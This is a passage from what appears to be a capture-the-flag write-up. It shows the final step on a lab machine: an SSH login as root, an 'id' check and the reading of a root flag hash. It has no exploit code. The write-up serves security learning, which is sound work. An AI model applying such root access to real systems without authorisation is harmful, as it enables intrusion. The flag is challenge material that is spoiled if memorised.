![Screenshot_2022-02-20_23-10-04](https://user-images.githubusercontent.com/42389836/154867154-172b374d-2f73-4ff2-8711-b2ac0b808a8f.png)

#### Root

Now we can access through SSH and grab both user and root flags:

```
# ssh root@10.129.95.132
The authenticity of host '10.129.95.132 (10.129.95.132)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.95.132' (ED25519) to the list of known hosts.
root@10.129.95.132's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

root@unified:~# id
uid=0(root) gid=0(root) groups=0(root)
root@unified:~# cat root.txt
e50bc93c75b634e4b272d2f771c33681
root@unified:~#
```





